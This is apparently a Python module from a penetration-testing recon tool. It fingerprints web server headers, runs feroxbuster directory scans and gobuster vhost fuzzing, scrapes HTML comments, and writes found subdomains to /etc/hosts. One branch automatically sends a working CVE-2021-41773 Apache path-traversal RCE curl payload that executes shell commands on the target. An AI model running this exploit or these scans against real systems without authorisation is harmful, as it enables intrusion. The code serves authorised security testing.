import subprocess
from mods.mod_utils import *
from mods import mod_dns
from mods.http_wordlist import wordlist
from urllib.parse import urlparse
import requests
import urllib3
import re
import os
import multiprocessing
from multiprocessing import Queue

# Globals
fast_wordlist = ''
comments_founded = []
urls_founded = []
domain = ''
server = ''
extensions = ['txt']

technologies = [
    'X-Powered-By',            # Technology used to power the server (e.g., PHP, ASP.NET)
    'Via',                     # Intermediate proxies or gateways
    'X-AspNet-Version',        # ASP.NET version
    'X-AspNetMvc-Version',     # ASP.NET MVC version
    'X-Backend-Server',        # Backend server information
    'X-Drupal-Cache',          # Drupal caching information
    'X-Drupal-Dynamic-Cache',  # Drupal dynamic cache status
    'X-Drupal-Cache-Tags',     # Drupal cache tags
    'X-Generator',             # Content management system (CMS) or framework generator
    'X-Joomla-Template',       # Joomla template used
    'X-Pingback',              # XML-RPC pingback URL (often used by WordPress)
    'X-Redirect-By',           # Redirection mechanism (often used by WordPress)
    'X-Powered-CMS',           # CMS powering the site
    'X-Shopify-Stage',         # Shopify stage environment
    'X-Turbo-Charged-By',      # Turbo caching system
    'X-Varnish',               # Varnish caching
    'X-Wix-Request-Id',        # Wix request identifier
    'X-WordPress-Cache',       # WordPress cache status
    'X-WordPress-Debug',       # WordPress debug information
    'X-WordPress-Theme',       # WordPress theme information
    'CF-Cache-Status',         # Cloudflare cache status
    'CF-Ray',                  # Cloudflare request identifier
    'CF-Request-ID',           # Cloudflare request ID
    'Fastly-Request-ID',       # Fastly request ID
    'X-CDN',                   # CDN information
    'X-Cache',                 # Cache status
    'X-Cache-Hits',            # Number of cache hits
    'X-Cache-Lookup',          # Cache lookup status
    'X-Cache-Status',          # Cache status indicator
    'WWW-Authenticate'         # Basic Authentication in place
]

# Disable insecure request warnings from urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:' # Start non-capturing group for domain
        r'(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' # domain...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?' # ...or ipv6
        r'|(?:[A-Z0-9-]+))' # or non-strict domain (e.g., tripladvisor)
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None


def is_blacklisted_url(url):
    blacklist = ['.png', '.jpg', '.css', '.ttf']
    for item in blacklist:
        if item in url: return True
    return False


def register_subdomains(subdomains, ip='127.0.0.1', cmd=None):
    result = True
    if len(subdomains) > 0:   
        if cmd:
            print(f'[!] {cmd}')
        printc('[+] Some subdomains have been found:', GREEN)
        for subdomain in subdomains:
            printc(f'[+] {subdomain}', BLUE)

            log(subdomain, '', ip)
        try: 
            mod_dns.dns_add_subdomains(ip, subdomains)
            printc('[+] Domain added correctly to /etc/hosts', GREEN)
        except Exception as e:
            result = False
            printc(f'[-] {e}', RED)
    return result


def create_short_wordlist():
    global fast_wordlist
    fast_wordlist_filename = f'{os.path.dirname(os.path.abspath(__file__))}/wordlist.txt'
    if not os.path.exists(fast_wordlist_filename):
        with open(fast_wordlist_filename, 'w') as file:
            file.write('\n'.join(wordlist))
            file.close()
    fast_wordlist = fast_wordlist_filename


def http_identify_server(host, port, proto='http'):
    global server
    global extensions
    
    if (server != ''): return
    response = make_request(update_url(host, port, proto))
    if not response: return

    tech = []

    try:
        if ('Server' in response.headers):
            server_header = response.headers['Server']
            server = server_header

        if ('Apache' in server_header):
            printc('[!] Apache server, Fuzzing for PHP files.', GREEN)
            extensions.append('html')
            extensions.append('php')

        if '2.4.49' in server_header:
            cmd = f"curl {proto}://{host}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'"
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

                if output:
                    if 'uid' in output:
                        print_banner(port)
                        printc('[+] Possible RCE confirmed. CVE-2021-41773', RED, YELLOW)
                        printc(cmd, BLUE)
                        print(output)
            except Exception as e:
                printc(f'[-] {e}', RED)
                return
        elif ('Microsoft-IIS' in server_header):
            printc('[!] Microsoft IIS server, Fuzzing for ASP, ASPX files.', GREEN)
            extensions.append('asp')
            extensions.append('php')
            extensions.append('aspx')
        elif ('Simple' in server_header) and ('Python' in server_header):
            printc('[!] Python Development Server, Directory listing should be enabled.', GREEN)
    
        else:
            print('[!] Unknown Server')
    
        printc(f'[+] {server_header}', BLUE)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return

    try:
        for technology in technologies:
            if technology in response.headers:
                tech.append(response.headers[technology])

        if len(tech) > 0:
            print('[!] Possible Technologies')
            for technology in tech:
                printc(f'[+] {technology}', BLUE)
            log('\n'.join(tech), '', host)
    except Exception as e:
        printc(f'[-] {e}', RED)
        return


def make_request(base_url):
    if not is_valid_url(base_url): return
    response = None
    try:
        response = requests.get(base_url, verify=False, allow_redirects=False)
    except requests.exceptions.SSLError as e:
        try:
            response = requests.get('http://' + base_url.split('://')[1], verify=False, allow_redirects=True)
        except Exception as e:
            error = str(e)
            if ('(' in error):
                error = error.replace(')', '').replace('(', '\n')
            printc(f'[-] {error}', RED)
    except Exception as e:
        error = str(e)
        if ('(' in error):
            error = error.replace(')', '').replace('(', '\n')
        printc(f'[-] {error}', RED)
    return response


def http_extract_comments(response):    
    if not response: return

    global comments_founded
    body = str(response.text)
    results_html = re.findall(r'(<!--.*-->)', body)
    results_version = re.findall(r'.*"(.{1,40}\d{1,1}\.\d{1,2}\.\d{0,2}.{1,40})".*\n', body)
    results_version_two = re.findall(r'.*>(.{1,40}\d{1,1}\.\d{1,2}\.\d{0,2}.{1,40})<.*\n', body)
    comments_founded += results_html 
    comments_founded += results_version 
    comments_founded += results_version_two


def get_domain(url):
    # Parse the URL and extract the hostname
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname

    # If there is no hostname, the URL might be invalid
    if not hostname:
        return None

    # Split the hostname into parts
    parts = hostname.split('.')

    # If the hostname is just an IP address or doesn't contain enough parts, return it as is
    if len(parts) < 2:
        return hostname

    # Return the domain and TLD
    return '.'.join(parts[-2:])


def call_ferox(filename, ip, port, proto='http', checkdns=True, silent=True):
    """Run feroxbuster and collect URLs."""
    collected_urls = []
    base_url = update_url(ip, port)
    cmd_printed = False
    
    if silent:
        cmd = f'feroxbuster -u {base_url} -w {filename} -x {",".join(list(set(extensions)))} -t 100 --no-state --extract-links -C 400,401,403,404,501,502,503 -r -k -E -g -d 1 --silent'
    else:
        cmd = f'feroxbuster -u {base_url} -w {filename} -x {",".join(list(set(extensions)))} -t 100 --no-state --extract-links -C 400,401,403,404,501,502,503 -r -k -E -g -d 1 -q'

    try:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)

        while True:
            line = process.stdout.readline()
            if not line:
                break
                
            line = line.strip()
            if not line:
                continue
                
            # Skip blacklisted URLs
            if is_blacklisted_url(line):
                continue
                
            # Handle internal subdomain error
            if ('could not connect' in line.lower()) and silent:
                silent = False
                new_urls = call_ferox(filename, ip, port, proto, checkdns, silent)
                if new_urls:
                    collected_urls.extend(new_urls)
                cmd_printed = True
                log('', cmd, ip, 'feroxbuster')
                break
                
            # Handle timeout and domain discovery
            elif ('operation timed out' in line.lower()):
                try:
                    domain_and_port = line.split('/')[2]
                    host = domain_and_port.split(':')[0]
                    if (host != ip) and checkdns:
                        global domain
                        if (domain == ''):
                            domain = get_domain(host)
                        # Register the new domain/subdomain
                        if not register_subdomains([host], ip): 
                            break
                        checkdns = False

                        # Test HTTPS
                        response = make_request(update_url(host, port, 'https'))
                        if response: 
                            proto = 'https'
                        
                        # Identify technologies
                        global server
                        server = ''
                        http_identify_server(host, port, proto)
                        
                        # Scan new domain
                        silent = True
                        new_urls = call_ferox(filename, host, port, proto, checkdns, silent)
                        if new_urls:
                            collected_urls.extend(new_urls)
                        cmd_printed = True
                        break
                except:
                    continue
                    
            # Process valid URL
            else:
                if not cmd_printed: 
                    print(f'[!] {cmd}\n')
                    cmd_printed = True
                    
                # Try to extract URL from the line
                url_match = re.search(r'https?://[^\s]+', line)
                if url_match:
                    url = url_match.group(0)
                    if url not in collected_urls:
                        collected_urls.append(url)
                        print(url)
                        log(url, '', ip, 'feroxbuster')

        process.kill()

    except Exception as e:
        if not cmd_printed: 
            print(f'[!] {cmd}\n')
        printc(f'[-] {e}', RED)
        return collected_urls

    return collected_urls


def http_fuzz_subdomains(port):
    filename = fast_wordlist

    cmd = f'gobuster vhost -u {domain} -w {filename} -t 70 -z --no-error --append-domain -k'
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except:
        return
    if output:
        log(output, cmd, domain, 'gobuster')
        results = output.splitlines()
        subdomains = []
        for line in results:
            if (domain in line):
                subdomain = line.split(' ')[1]
                subdomains.append(subdomain)   
        register_subdomains(subdomains, cmd)
        
        if len(subdomain) > 0:
            for host in subdomains:
                for url in urls_founded:
                    if host not in url: call_ferox(fast_wordlist, host, port)


def update_url(host, port, proto='http'):
    return f'{proto}://{host}:{port}'


def handle_http(ip, port):
    #printc('http', RED)
    
    error_display_port = port 

    create_short_wordlist()

    # Create a list to store processes
    procs = []

    # PRINT BANNER
    print_banner(error_display_port)
    # IDENTIFY SERVER TECHNOLOGIES
    http_identify_server(ip, port)
    # PRINT INITIAL URL
    printc(f'[!] URL: {update_url(ip, port)}', GREEN)
    
    # Use a Queue to get results back from the process
    result_queue = Queue()
    
    # Create process for feroxbuster
    def run_ferox(queue):
        try:
            urls = call_ferox(fast_wordlist, ip, port)
            if urls:
                queue.put(urls)
            print('')
        except Exception as e:
            printc(f'[-] Error in feroxbuster scan: {str(e)}', RED)
            queue.put([])
    
    ferox_proc = multiprocessing.Process(target=run_ferox, args=(result_queue,))
    procs.append(ferox_proc)
    
    # Launch feroxbuster process
    procs = launch_procs(procs)
    
    # Get URLs from the queue
    try:
        urls = result_queue.get(timeout=1)  # 1 second timeout
    except:
        urls = []
        
    # Extract comments and process URLs
    if urls:
        printc(f'[!] Scanning the URLs found for comments', GREEN)
        for url in urls:
            http_extract_comments(make_request(url))
            
        # PRINT COMMENTS
        if len(comments_founded) > 0:
            print(f'[!] Comments found:')
            data = '\n'.join(list(set(comments_founded)))
            printc(data, GREEN)
            log(data, '', ip)
    
    # Create process for subdomain fuzzing
    if domain != '':
        def run_subdomain_fuzz():
            http_fuzz_subdomains(port)
        
        subdomain_proc = multiprocessing.Process(target=run_subdomain_fuzz)
        procs = [subdomain_proc]  # New list since we're done with ferox_proc
        procs = launch_procs(procs)

